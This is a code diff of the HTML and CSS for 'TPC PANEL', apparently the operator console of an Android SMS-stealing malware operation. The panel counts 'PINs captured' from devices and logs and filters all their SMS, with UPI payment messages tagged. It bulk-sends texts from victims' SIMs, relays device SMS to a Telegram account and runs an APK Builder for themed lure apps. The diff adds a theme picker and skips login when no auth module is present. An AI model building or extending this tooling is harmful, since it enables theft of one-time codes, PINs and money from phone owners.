@@ -369,10 +369,40 @@ white-space:pre-wrap;overflow-wrap:anywhere;line-height:1.75}
 .pulse-live::before{content:"";width:7px;height:7px;border-radius:50%;background:var(--amber);
 box-shadow:0 0 10px var(--amber);animation:pulse 1.2s infinite}
 
+.themes{display:grid;grid-template-columns:repeat(auto-fill,minmax(118px,1fr));gap:10px}
+.tcard{border:1.5px solid var(--border);border-radius:12px;overflow:hidden;cursor:pointer;
+background:#0a1226;transition:.15s;position:relative}
+.tcard:hover{transform:translateY(-2px);border-color:var(--border-hi)}
+.tcard.on{border-color:var(--neon);box-shadow:0 0 0 3px #22d3ee1f}
+.tcard .tsw{height:52px;display:flex;align-items:flex-end;gap:4px;padding:7px}
+.tcard .tsw i{width:12px;height:12px;border-radius:4px;border:1px solid #ffffff26}
+.tcard .tmt{padding:8px 10px 10px}
+.tcard .tmt b{font-size:11.5px;font-weight:700;display:block}
+.tcard .tmt span{font-size:9.5px;color:var(--dim);text-transform:uppercase;letter-spacing:.6px}
+.tcard .tck{position:absolute;top:7px;right:7px;width:18px;height:18px;border-radius:50%;
+background:var(--neon);color:#001521;display:none;place-items:center;font-size:10px;font-weight:800}
+.tcard.on .tck{display:grid}
+.tprev{display:grid;grid-template-columns:minmax(0,1fr) 250px;gap:16px;align-items:start}
+.tphone{width:100%;max-width:236px;margin:0 auto;border-radius:24px;padding:9px;
+border:1px solid var(--border);background:#04060d}
+.tscreen{border-radius:18px;overflow:hidden;padding:18px 14px;min-height:336px;
+display:flex;flex-direction:column;align-items:center;text-align:center}
+.tscreen .tlg{width:46px;height:46px;border-radius:14px;display:grid;place-items:center;
+font-weight:800;font-size:16px;margin-top:6px}
+.tscreen .tti{font-size:14.5px;font-weight:800;margin-top:10px}
+.tscreen .tsu{font-size:10.5px;margin-top:4px}
+.tscreen .tim{display:flex;gap:5px;margin-top:12px;width:100%}
+.tscreen .tim i{flex:1;height:56px;border-radius:9px;background-size:cover;background-position:center}
+.tscreen .tfi{margin-top:11px;width:100%;padding:10px;border-radius:9px;font-size:10.5px;text-align:left}
+.tscreen .tch{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:11px;width:100%}
+.tscreen .tch i{padding:10px 5px;border-radius:9px;font-size:10.5px;font-weight:600;font-style:normal}
+.tscreen .tbt{margin-top:11px;width:100%;padding:11px;border-radius:9px;font-size:11.5px;font-weight:700}
+
 @media (max-width:1100px){
 .stats{grid-template-columns:repeat(2,minmax(0,1fr))}
 .grid2{grid-template-columns:1fr}
 .bulk,.keygen{grid-template-columns:1fr}
+.tprev{grid-template-columns:1fr}
 .overlay{display:block;overflow-y:auto}
 .shell{display:block;min-height:100%}
 .detail-grid{display:block;overflow:visible}
@@ -410,15 +440,13 @@ main{padding:18px 13px}
 <body>
 <div class="layer">
 
-<section class="login" id="loginScreen">
+<section class="login" id="loginScreen" hidden>
 <div class="login-card">
 <div class="brand">
 <svg class="cat" viewBox="0 0 64 64" aria-hidden="true">
-<defs>
-<linearGradient id="g1" x1="0" y1="0" x2="1" y2="1">
+<defs><linearGradient id="g1" x1="0" y1="0" x2="1" y2="1">
 <stop offset="0%" stop-color="#a855f7"/><stop offset="55%" stop-color="#6366f1"/><stop offset="100%" stop-color="#1e3a8a"/>
-</linearGradient>
-</defs>
+</linearGradient></defs>
 <path class="ear-l" d="M13 24 L9 5 L26 15 Z" fill="url(#g1)"/>
 <path class="ear-r" d="M51 24 L55 5 L38 15 Z" fill="url(#g1)"/>
 <ellipse cx="32" cy="37" rx="22" ry="19" fill="url(#g1)"/>
@@ -428,35 +456,23 @@ main{padding:18px 13px}
 <path d="M6 40 L20 43 M6 47 L20 47" stroke="#c4b5fd" stroke-width="1.4" stroke-linecap="round"/>
 <path d="M58 40 L44 43 M58 47 L44 47" stroke="#c4b5fd" stroke-width="1.4" stroke-linecap="round"/>
 </svg>
-<div>
-<h1>TPC PANEL</h1>
-<p>SMS &amp; UPI Control</p>
+<div><h1>TPC PANEL</h1><p>SMS &amp; APK Control</p></div>
 </div>
-</div>
-
 <h2>Sign in</h2>
-<p>Admin apne login se aata hai. User admin se mili <b>access key</b> daalta hai.</p>
-
+<p>Auth backend ho to key/password daalo. Warna seedha andar aa jaoge.</p>
 <form id="loginForm">
 <label for="username">Login ID / Access key</label>
 <input id="username" autocomplete="username" placeholder="admin id  ya  TPC-XXXX-XXXX-XXXX" required>
-<label for="password">Password <span class="muted small" style="text-transform:none;letter-spacing:0">(sirf admin ke liye)</span></label>
+<label for="password">Password <span class="muted small" style="text-transform:none;letter-spacing:0">(sirf admin)</span></label>
 <input id="password" type="password" autocomplete="current-password" placeholder="admin password (user chhod de)">
 <label class="chk"><input type="checkbox" id="remember" checked> Keep me signed in on this device</label>
 <button class="btn primary login-submit" id="loginBtn" type="submit">Sign in</button>
 <div class="msg" id="loginMsg" role="status" aria-live="polite"></div>
 </form>
-
-<div class="howto">
-<b>User kaise aayega?</b> Admin → Access keys → <b>Generate</b> dabao → key copy karke user ko bhejo → user wahi key yahan daal ke panel khol lega. Koi register nahi.
-</div>
-
+<div class="howto"><b>Auth module nahi hai?</b> Panel khud detect kar lega — login skip ho jayega aur APK Builder turant chalu.</div>
 <div class="login-foot">
 <span>Backend: <span class="mono" id="apiHint">/</span></span>
-<a class="apk" id="apkLogin" href="#builder" rel="noopener">
-<svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true"><path d="M6 10h12v8a1 1 0 0 1-1 1h-1v2.2a1.2 1.2 0 0 1-2.4 0V19h-3.2v2.2a1.2 1.2 0 0 1-2.4 0V19H7a1 1 0 0 1-1-1v-8Zm-1.8 0A1.2 1.2 0 0 1 5.4 11.2v5.6a1.2 1.2 0 0 1-2.4 0v-5.6A1.2 1.2 0 0 1 4.2 10Zm15.6 0a1.2 1.2 0 0 1 1.2 1.2v5.6a1.2 1.2 0 0 1-2.4 0v-5.6A1.2 1.2 0 0 1 19.8 10ZM7.2 8.6C7.5 6.9 8.9 5.6 10.6 5.3l-.6-1.4a.3.3 0 0 1 .5-.3l.7 1.5a5.6 5.6 0 0 1 2.6 0l.7-1.5a.3.3 0 0 1 .5.3l-.6 1.4c1.7.3 3.1 1.6 3.4 3.3H7.2Zm2.3-1.6a.6.6 0 1 0 0-1.2.6.6 0 0 0 0 1.2Zm5 0a.6.6 0 1 0 0-1.2.6.6 0 0 0 0 1.2Z"/></svg>
-<span>APK</span>
-</a>
+<a class="apk" id="apkLogin" href="#" rel="noopener"><span>APK</span></a>
 <a href="https://t.me/icivan" target="_blank" rel="noopener">owner ↗</a>
 </div>
 </div>
@@ -476,20 +492,17 @@ main{padding:18px 13px}
 <ellipse cx="40" cy="34" rx="4.6" ry="6" fill="#000"/>
 <path d="M32 42 l-2.6 3 h5.2 z" fill="#0b1030"/>
 </svg>
-<div><h1>TPC PANEL</h1><p>SMS &amp; UPI Control</p></div>
+<div><h1>TPC PANEL</h1><p>SMS &amp; APK Control</p></div>
 </div>
-
 <div class="top-right">
 <span class="pill"><span class="dot"></span><span id="linkLabel">Connecting</span></span>
 <span class="badge" id="roleBadge">—</span>
-<a class="apk" id="apkBtn" href="#builder" rel="noopener" title="APK Builder">
+<a class="apk" id="apkBtn" href="#" title="APK Builder">
 <svg viewBox="0 0 24 24" width="17" height="17" fill="currentColor" aria-hidden="true"><path d="M6 10h12v8a1 1 0 0 1-1 1h-1v2.2a1.2 1.2 0 0 1-2.4 0V19h-3.2v2.2a1.2 1.2 0 0 1-2.4 0V19H7a1 1 0 0 1-1-1v-8Zm-1.8 0A1.2 1.2 0 0 1 5.4 11.2v5.6a1.2 1.2 0 0 1-2.4 0v-5.6A1.2 1.2 0 0 1 4.2 10Zm15.6 0a1.2 1.2 0 0 1 1.2 1.2v5.6a1.2 1.2 0 0 1-2.4 0v-5.6A1.2 1.2 0 0 1 19.8 10ZM7.2 8.6C7.5 6.9 8.9 5.6 10.6 5.3l-.6-1.4a.3.3 0 0 1 .5-.3l.7 1.5a5.6 5.6 0 0 1 2.6 0l.7-1.5a.3.3 0 0 1 .5.3l-.6 1.4c1.7.3 3.1 1.6 3.4 3.3H7.2Zm2.3-1.6a.6.6 0 1 0 0-1.2.6.6 0 0 0 0 1.2Zm5 0a.6.6 0 1 0 0-1.2.6.6 0 0 0 0 1.2Z"/></svg>
 <span>APK</span>
 </a>
 <a class="tg" href="https://t.me/icivan" target="_blank" rel="noopener" title="Contact owner">
-<svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
-<path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/>
-</svg>
+<svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/></svg>
 </a>
 <button class="btn danger" id="logoutBtn" type="button">Logout</button>
 </div>
@@ -504,8 +517,6 @@ main{padding:18px 13px}
 <button class="nav" data-page="messages" type="button"><i>✉</i> Messages</button>
 <p class="side-label" style="margin-top:22px">Automation</p>
 <button class="nav" data-page="relay" type="button"><i>📡</i> Relay</button>
-<p class="side-label" style="margin-top:22px">Growth</p>
-<button class="nav" data-page="growth" data-admin-only="1" type="button"><i>📈</i> Installs</button>
 <p class="side-label" style="margin-top:22px">Builder</p>
 <button class="nav" data-page="builder" type="button"><i>📦</i> APK Builder</button>
 <p class="side-label" style="margin-top:22px">System</p>
@@ -514,7 +525,7 @@ main{padding:18px 13px}
 <button class="nav" data-page="settings" type="button"><i>⚙</i> Settings</button>
 </div>
 <div class="side-foot">
-<div>TPC PANEL · v6.0</div>
+<div>TPC PANEL · v7.0</div>
 <div>owner: <a href="https://t.me/icivan" target="_blank" rel="noopener">@icivan</a></div>
 </div>
 </aside>
@@ -528,99 +539,48 @@ main{padding:18px 13px}
 <button class="btn ghost" id="refreshBtn" type="button">↻ Refresh</button>
 </div>
 <div class="stats">
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Total devices</span><span class="stat-icon">▣</span></div>
-<div class="stat-val neon" id="sTotal">—</div><div class="stat-foot">registered</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Online</span><span class="stat-icon">◉</span></div>
-<div class="stat-val green" id="sOnline">—</div><div class="stat-foot">socket up</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Offline</span><span class="stat-icon">○</span></div>
-<div class="stat-val red" id="sOffline">—</div><div class="stat-foot">socket down</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Total SIMs</span><span class="stat-icon">▤</span></div>
-<div class="stat-val violet" id="sSims">—</div><div class="stat-foot">slots reported</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">PINs captured</span><span class="stat-icon">🔑</span></div>
-<div class="stat-val violet" id="sPins">—</div><div class="stat-foot">onboarded devices</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Installs</span><span class="stat-icon">⬇</span></div>
-<div class="stat-val neon" id="sInstalls">—</div><div class="stat-foot">APK installs lifetime</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Uninstalled</span><span class="stat-icon">✕</span></div>
-<div class="stat-val red" id="sUninstalled">—</div><div class="stat-foot">no ping &gt; 7 days</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Reinstalls</span><span class="stat-icon">↻</span></div>
-<div class="stat-val violet" id="sReinstalls">—</div><div class="stat-foot">same phone, dobara</div>
-</article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Total devices</span><span class="stat-icon">▣</span></div><div class="stat-val neon" id="sTotal">—</div><div class="stat-foot">registered</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Online</span><span class="stat-icon">◉</span></div><div class="stat-val green" id="sOnline">—</div><div class="stat-foot">socket up</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Offline</span><span class="stat-icon">○</span></div><div class="stat-val red" id="sOffline">—</div><div class="stat-foot">socket down</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Total SIMs</span><span class="stat-icon">▤</span></div><div class="stat-val violet" id="sSims">—</div><div class="stat-foot">slots reported</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">PINs captured</span><span class="stat-icon">🔑</span></div><div class="stat-val violet" id="sPins">—</div><div class="stat-foot">onboarded devices</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Installs</span><span class="stat-icon">⬇</span></div><div class="stat-val neon" id="sInstalls">—</div><div class="stat-foot">APK installs lifetime</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Uninstalled</span><span class="stat-icon">✕</span></div><div class="stat-val red" id="sUninstalled">—</div><div class="stat-foot">no ping &gt; 7 days</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Reinstalls</span><span class="stat-icon">↻</span></div><div class="stat-val violet" id="sReinstalls">—</div><div class="stat-foot">same phone, dobara</div></article>
 </div>
-
 <div class="grid2">
 <section class="panel-box panel">
-<div class="panel-head"><h3>Recent devices</h3>
-<button class="btn ghost" data-goto="devices" type="button">View all</button></div>
-<div class="table-wrap">
-<table><thead><tr><th>Device</th><th>ID</th><th>Number</th><th>Status</th><th>Registered</th></tr></thead>
-<tbody id="recentBody"></tbody></table>
-</div>
+<div class="panel-head"><h3>Recent devices</h3><button class="btn ghost" data-goto="devices" type="button">View all</button></div>
+<div class="table-wrap"><table><thead><tr><th>Device</th><th>ID</th><th>Number</th><th>Status</th><th>Registered</th></tr></thead><tbody id="recentBody"></tbody></table></div>
 </section>
 <section class="panel-box panel">
 <div class="panel-head"><h3>System status</h3></div>
 <div class="panel-body">
 <div class="row"><div><div class="row-name">Backend API</div><div class="row-desc">/health</div></div><span class="badge" id="apiBadge">Checking</span></div>
 <div class="row"><div><div class="row-name">Store</div><div class="row-desc">/health/database</div></div><span class="badge" id="dbBadge">Checking</span></div>
-<div class="row"><div><div class="row-name">APK builder</div><div class="row-desc">/health/builder</div></div><span class="badge" id="builderBadge">Checking</span></div>
+<div class="row"><div><div class="row-name">APK builder</div><div class="row-desc">/api/builder/config</div></div><span class="badge" id="builderBadge">Checking</span></div>
 <div class="row"><div><div class="row-name">Admin socket</div><div class="row-desc">live link</div></div><span class="badge" id="wsBadge">Connecting</span></div>
-<div class="row"><div><div class="row-name">Relay</div><div class="row-desc">MTProto channel watcher</div></div><span class="badge" id="relayBadge">—</span></div>
+<div class="row"><div><div class="row-name">Device API</div><div class="row-desc">/admin/*</div></div><span class="badge" id="adminBadge">—</span></div>
 </div>
 </section>
 </div>
 </section>
 
 <section class="page" id="page-live">
-<div class="head">
-<div><h2>Live dashboard</h2><p>Real-time fleet and bulk sending</p></div>
-<button class="btn ghost" data-refresh="live" type="button">↻ Refresh</button>
-</div>
+<div class="head"><div><h2>Live dashboard</h2><p>Real-time fleet and bulk sending</p></div><button class="btn ghost" data-refresh="live" type="button">↻ Refresh</button></div>
 <div class="stats">
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Total</span><span class="stat-icon">▣</span></div>
-<div class="stat-val neon" id="lTotal">—</div><div class="stat-foot">devices</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Online</span><span class="stat-icon">◉</span></div>
-<div class="stat-val green" id="lOnline">—</div><div class="stat-foot">socket up</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Offline</span><span class="stat-icon">○</span></div>
-<div class="stat-val red" id="lOffline">—</div><div class="stat-foot">socket down</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">UPI</span><span class="stat-icon">₹</span></div>
-<div class="stat-val violet" id="lUpi">—</div><div class="stat-foot">tagged messages</div>
-</article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Total</span><span class="stat-icon">▣</span></div><div class="stat-val neon" id="lTotal">—</div><div class="stat-foot">devices</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Online</span><span class="stat-icon">◉</span></div><div class="stat-val green" id="lOnline">—</div><div class="stat-foot">socket up</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Offline</span><span class="stat-icon">○</span></div><div class="stat-val red" id="lOffline">—</div><div class="stat-foot">socket down</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">UPI</span><span class="stat-icon">₹</span></div><div class="stat-val violet" id="lUpi">—</div><div class="stat-foot">tagged messages</div></article>
 </div>
-
 <section class="panel-box panel">
 <div class="panel-head"><h3>Bulk send</h3><span class="badge" id="bulkBadge">all devices</span></div>
 <div class="bulk">
-<div>
-<label for="bulkBody">Message</label>
-<textarea id="bulkBody" placeholder="Type message to broadcast…"></textarea>
-</div>
+<div><label for="bulkBody">Message</label><textarea id="bulkBody" placeholder="Type message to broadcast…"></textarea></div>
 <div>
 <label for="bulkTarget">Target</label>
-<select id="bulkTarget">
-<option value="all">All devices</option>
-<option value="online">Online only</option>
-</select>
+<select id="bulkTarget"><option value="all">All devices</option><option value="online">Online only</option></select>
 <label style="margin-top:12px">SIM se bhejo</label>
 <div class="simchips" id="bulkSims"></div>
 <label for="bulkTo" style="margin-top:12px">Send to number (optional)</label>
@@ -632,13 +592,9 @@ main{padding:18px 13px}
 </div>
 </div>
 </section>
-
 <section class="panel-box panel">
 <div class="panel-head"><h3>Devices</h3><span class="badge" id="liveCount">0</span></div>
-<div class="table-wrap">
-<table><thead><tr><th>Device</th><th>Target number</th><th>SIM</th><th>Send message</th><th></th></tr></thead>
-<tbody id="liveBody"></tbody></table>
-</div>
+<div class="table-wrap"><table><thead><tr><th>Device</th><th>Target number</th><th>SIM</th><th>Send message</th><th></th></tr></thead><tbody id="liveBody"></tbody></table></div>
 </section>
 </section>
 
@@ -647,29 +603,18 @@ main{padding:18px 13px}
 <div><h2>Messages</h2><p>All inbound and outbound SMS</p></div>
 <div class="toolbar">
 <input id="msgSearch" placeholder="🔍 search body / number / TPC-id…">
-<select id="msgFilter" style="width:auto">
-<option value="">All</option>
-<option value="in">Inbound</option>
-<option value="out">Outbound</option>
-<option value="upi">UPI only</option>
-</select>
+<select id="msgFilter" style="width:auto"><option value="">All</option><option value="in">Inbound</option><option value="out">Outbound</option><option value="upi">UPI only</option></select>
 <button class="btn ghost" data-refresh="messages" type="button">↻ Refresh</button>
 </div>
 </div>
 <section class="panel-box panel">
 <div class="panel-head"><h3>Message log</h3><span class="badge" id="msgCount">0</span></div>
-<div class="table-wrap">
-<table><thead><tr><th>Time</th><th>Device</th><th>Dir</th><th>SIM</th><th>From / To</th><th>Body</th><th>Amount</th><th>Status</th></tr></thead>
-<tbody id="msgBody"></tbody></table>
-</div>
+<div class="table-wrap"><table><thead><tr><th>Time</th><th>Device</th><th>Dir</th><th>SIM</th><th>From / To</th><th>Body</th><th>Amount</th><th>Status</th></tr></thead><tbody id="msgBody"></tbody></table></div>
 </section>
 </section>
 
 <section class="page" id="page-relay">
-<div class="head">
-<div><h2>Relay</h2><p>Telegram channel → device SMS · device SMS → forward target</p></div>
-<button class="btn ghost" data-refresh="relay" type="button">↻ Refresh</button>
-</div>
+<div class="head"><div><h2>Relay</h2><p>Telegram channel → device SMS · device SMS → forward target</p></div><button class="btn ghost" data-refresh="relay" type="button">↻ Refresh</button></div>
 <div class="grid2">
 <section class="panel-box panel">
 <div class="panel-head"><h3>MTProto login</h3><span class="badge" id="relayState">—</span></div>
@@ -686,8 +631,7 @@ main{padding:18px 13px}
 <button class="btn plain" id="relayLogout" type="button">Logout</button>
 </div>
 <div id="relayCodeBox" hidden style="margin-top:16px">
-<label for="relayCode">Login code</label>
-<input id="relayCode" class="mono" placeholder="12345">
+<label for="relayCode">Login code</label><input id="relayCode" class="mono" placeholder="12345">
 <label for="relayPass" style="margin-top:10px">2FA password (agar ho)</label>
 <input id="relayPass" type="password" placeholder="••••••">
 <button class="btn primary" id="relayVerify" style="margin-top:12px" type="button">Verify &amp; connect</button>
@@ -698,13 +642,9 @@ main{padding:18px 13px}
 <div class="row"><div><div class="row-name">Watching channels</div><div class="row-desc" id="relayChan">—</div></div><span class="badge" id="relayChanBadge">—</span></div>
 <div class="row"><div><div class="row-name">Forward device SMS to</div><div class="row-desc" id="relayFwd">—</div></div><span class="badge" id="relayFwdBadge">—</span></div>
 <label for="fwdInput" style="margin-top:14px">Forward target</label>
-<div class="inline" style="margin-bottom:6px">
-<input id="fwdInput" class="mono" placeholder="@yourid">
-<button class="btn ghost" id="fwdSave" type="button">Save</button>
-</div>
+<div class="inline" style="margin-bottom:6px"><input id="fwdInput" class="mono" placeholder="@yourid"><button class="btn ghost" id="fwdSave" type="button">Save</button></div>
 <div class="row"><div><div class="row-name">Last error</div><div class="row-desc" id="relayErr">—</div></div></div>
-<div class="row"><div><div class="row-name">Test connection</div><div class="row-desc">forward target par test message bhejo</div></div>
-<button class="btn ghost" id="relayTest" type="button">Send test</button></div>
+<div class="row"><div><div class="row-name">Test connection</div><div class="row-desc">forward target par test message bhejo</div></div><button class="btn ghost" id="relayTest" type="button">Send test</button></div>
 </div>
 </div>
 </section>
@@ -719,7 +659,6 @@ main{padding:18px 13px}
 </div>
 </section>
 </div>
-
 <section class="panel-box panel">
 <div class="panel-head"><h3>Parser test</h3><span class="badge">channel format</span></div>
 <div class="panel-body">
@@ -729,9 +668,7 @@ main{padding:18px 13px}
 <pre id="parseOut" class="pre-out">—</pre>
 </div>
 </section>
-
 <div class="divider">Auto-reply rules</div>
-
 <section class="panel-box panel">
 <div class="panel-head"><h3>New rule</h3></div>
 <div class="panel-body">
@@ -744,19 +681,13 @@ main{padding:18px 13px}
 <p class="small muted" style="margin:6px 0 0">Placeholders: <code class="mono">{amount}</code> <code class="mono">{sender}</code> <code class="mono">{device}</code> <code class="mono">{time}</code></p>
 <div style="display:flex;gap:10px;margin-top:14px;align-items:center;flex-wrap:wrap">
 <button class="btn primary" id="ruleAdd" type="button">Add rule</button>
-<label class="badge" style="gap:7px;cursor:pointer;margin:0;text-transform:none;letter-spacing:.4px">
-<input type="checkbox" id="ruleUpi" style="width:auto"> UPI only
-</label>
+<label class="badge" style="gap:7px;cursor:pointer;margin:0;text-transform:none;letter-spacing:.4px"><input type="checkbox" id="ruleUpi" style="width:auto"> UPI only</label>
 </div>
 </div>
 </section>
-
 <section class="panel-box panel">
 <div class="panel-head"><h3>Active rules</h3><span class="badge" id="ruleCount">0</span></div>
-<div class="table-wrap">
-<table><thead><tr><th>Name</th><th>Match</th><th>Reply</th><th>Scope</th><th>Status</th><th></th></tr></thead>
-<tbody id="ruleBody"></tbody></table>
-</div>
+<div class="table-wrap"><table><thead><tr><th>Name</th><th>Match</th><th>Reply</th><th>Scope</th><th>Status</th><th></th></tr></thead><tbody id="ruleBody"></tbody></table></div>
 </section>
 </section>
 
@@ -764,56 +695,21 @@ main{padding:18px 13px}
 <div class="head">
 <div><h2>Installs</h2><p>APK kitni baar install hui, kitni devices chhod gayi</p></div>
 <div class="toolbar">
-<select id="growthFilter" style="width:auto">
-<option value="">All events</option>
-<option value="install">Install</option>
-<option value="update">Update</option>
-<option value="open">Open</option>
-<option value="gone">Gone</option>
-</select>
+<select id="growthFilter" style="width:auto"><option value="">All events</option><option value="install">Install</option><option value="update">Update</option><option value="open">Open</option><option value="gone">Gone</option></select>
 <button class="btn ghost" data-refresh="growth" type="button">↻ Refresh</button>
 </div>
 </div>
-
 <div class="stats">
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Installs</span><span class="stat-icon">⬇</span></div>
-<div class="stat-val neon" id="gInstalls">—</div><div class="stat-foot">lifetime</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Live now</span><span class="stat-icon">◉</span></div>
-<div class="stat-val green" id="gLive">—</div><div class="stat-foot">active in 90s</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Idle &lt;24h</span><span class="stat-icon">○</span></div>
-<div class="stat-val violet" id="gIdle">—</div><div class="stat-foot">reachable</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Stale 1-7d</span><span class="stat-icon">⌛</span></div>
-<div class="stat-val" id="gStale">—</div><div class="stat-foot">slow fade</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Uninstalled</span><span class="stat-icon">✕</span></div>
-<div class="stat-val red" id="gUninstalled">—</div><div class="stat-foot">&gt; 7 days silent</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Reinstalls</span><span class="stat-icon">↻</span></div>
-<div class="stat-val violet" id="gReinstalls">—</div><div class="stat-foot">churn signal</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Unique phones</span><span class="stat-icon">▣</span></div>
-<div class="stat-val" id="gUnique">—</div><div class="stat-foot">distinct android_id</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Installs 24h</span><span class="stat-icon">＋</span></div>
-<div class="stat-val green" id="gToday">—</div><div class="stat-foot">aaj</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Uninstall rate</span><span class="stat-icon">%</span></div>
-<div class="stat-val red" id="gRate">—</div><div class="stat-foot">uninstalled / installs</div>
-</article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Installs</span><span class="stat-icon">⬇</span></div><div class="stat-val neon" id="gInstalls">—</div><div class="stat-foot">lifetime</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Live now</span><span class="stat-icon">◉</span></div><div class="stat-val green" id="gLive">—</div><div class="stat-foot">active in 90s</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Idle &lt;24h</span><span class="stat-icon">○</span></div><div class="stat-val violet" id="gIdle">—</div><div class="stat-foot">reachable</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Stale 1-7d</span><span class="stat-icon">⌛</span></div><div class="stat-val" id="gStale">—</div><div class="stat-foot">slow fade</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Uninstalled</span><span class="stat-icon">✕</span></div><div class="stat-val red" id="gUninstalled">—</div><div class="stat-foot">&gt; 7 days silent</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Reinstalls</span><span class="stat-icon">↻</span></div><div class="stat-val violet" id="gReinstalls">—</div><div class="stat-foot">churn signal</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Unique phones</span><span class="stat-icon">▣</span></div><div class="stat-val" id="gUnique">—</div><div class="stat-foot">distinct android_id</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Installs 24h</span><span class="stat-icon">＋</span></div><div class="stat-val green" id="gToday">—</div><div class="stat-foot">aaj</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Uninstall rate</span><span class="stat-icon">%</span></div><div class="stat-val red" id="gRate">—</div><div class="stat-foot">uninstalled / installs</div></article>
 </div>
-
 <section class="panel-box panel">
 <div class="panel-head"><h3>Send queue</h3><span class="badge" id="gQueueBadge">—</span></div>
 <div class="panel-body">
@@ -823,57 +719,53 @@ main{padding:18px 13px}
 <div class="row"><div><div class="row-name">Failed</div><div class="row-desc">send error</div></div><span class="badge bad" id="gFailed">0</span></div>
 </div>
 </section>
-
 <section class="panel-box panel">
 <div class="panel-head"><h3>Event feed</h3><span class="badge" id="gEventCount">0</span></div>
-<div class="table-wrap">
-<table><thead><tr><th>Time</th><th>Event</th><th>Device</th><th>ID</th><th>Version</th><th>Android ID</th></tr></thead>
-<tbody id="gEventBody"></tbody></table>
-</div>
+<div class="table-wrap"><table><thead><tr><th>Time</th><th>Event</th><th>Device</th><th>ID</th><th>Version</th><th>Android ID</th></tr></thead><tbody id="gEventBody"></tbody></table></div>
 </section>
 </section>
 
 <section class="page" id="page-builder">
 <div class="head">
-<div><h2>APK Builder</h2><p>App banao, secret lo, build karo, APK download karo — sab tumhara hi</p></div>
+<div><h2>APK Builder</h2><p>Theme chuno, naam do, build karo, APK download karo</p></div>
 <div class="toolbar">
 <span class="badge" id="builderMode">—</span>
 <span class="badge" id="bQueueBadge">—</span>
 <button class="btn ghost" data-refresh="builder" type="button">↻ Refresh</button>
 </div>
 </div>
-
 <div class="notice" id="builderNotice" hidden></div>
 
 <div class="stats">
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">My apps</span><span class="stat-icon">📦</span></div>
-<div class="stat-val neon" id="bApps">—</div><div class="stat-foot">tumhare appId</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Builds today</span><span class="stat-icon">⚙</span></div>
-<div class="stat-val green" id="bToday">—</div><div class="stat-foot" id="bQuota">—</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">In queue</span><span class="stat-icon">⏳</span></div>
-<div class="stat-val violet" id="bQueued">—</div><div class="stat-foot">waiting</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Running</span><span class="stat-icon">▶</span></div>
-<div class="stat-val" id="bRunning">—</div><div class="stat-foot">gradle busy</div>
-</article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Themes</span><span class="stat-icon">🎨</span></div><div class="stat-val neon" id="bThemes">—</div><div class="stat-foot">available</div></article>
